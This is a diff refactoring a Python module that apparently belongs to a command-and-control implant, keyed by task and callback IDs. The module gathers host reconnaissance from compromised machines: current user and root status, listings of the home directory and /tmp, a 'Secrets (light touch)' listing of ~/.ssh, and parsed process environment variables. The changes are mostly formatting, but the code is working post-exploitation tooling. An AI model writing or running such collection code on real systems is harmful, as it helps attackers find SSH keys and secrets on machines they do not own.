@@ -14,20 +14,11 @@ def run_cmd(cmd):
             stderr=subprocess.STDOUT,
             timeout=5
         )
-        return {
-            "success": True,
-            "output": output.decode(errors="ignore").strip()
-        }
+        return {"success": True, "output": output.decode(errors="ignore").strip()}
     except subprocess.TimeoutExpired:
-        return {
-            "success": False,
-            "error": "timeout"
-        }
+        return {"success": False, "error": "timeout"}
     except Exception as e:
-        return {
-            "success": False,
-            "error": str(e)
-        }
+        return {"success": False, "error": str(e)}
 
 
 def parse_environ(result):
@@ -39,23 +30,17 @@ def parse_environ(result):
 
     env = {}
     raw = result.get("output", "")
-
     for item in raw.split("\x00"):
         if "=" in item:
             k, v = item.split("=", 1)
             env[k] = v
 
-    return {
-        "success": True,
-        "variables": env
-    }
+    return {"success": True, "variables": env}
 
 
 def execute(params, task_id, callback_id):
     start_time = time.time()
-
     mode = params.strip().lower() if params else "quick"
-
     home_dir = os.path.expanduser("~")
 
     data = {}
@@ -70,9 +55,7 @@ def execute(params, task_id, callback_id):
 
     # User context
     uid_result = run_cmd(["id", "-u"])
-    is_root = False
-    if uid_result.get("success") and uid_result.get("output") == "0":
-        is_root = True
+    is_root = uid_result.get("success") and uid_result.get("output") == "0"
 
     data["user"] = {
         "current": run_cmd(["whoami"]),
@@ -99,14 +82,10 @@ def execute(params, task_id, callback_id):
         "home": run_cmd(["ls", "-la", home_dir]),
         "tmp": run_cmd(["ls", "-la", "/tmp"]),
     }
-    
-    ssh_dir = os.path.join(home_dir, ".ssh")
-    if not os.path.exists(ssh_dir):
-        ssh_dir = None
 
-    # Secrets (light touch)
+    ssh_dir = os.path.join(home_dir, ".ssh")
     data["secrets"] = {
-    "ssh_keys": run_cmd(["ls", "-la", ssh_dir]) if ssh_dir else {"success": False, "error": "no .ssh directory"}
+        "ssh_keys": run_cmd(["ls", "-la", ssh_dir]) if os.path.exists(ssh_dir) else {"success": False, "error": "no .ssh directory"}
     }
 
     # Proc data
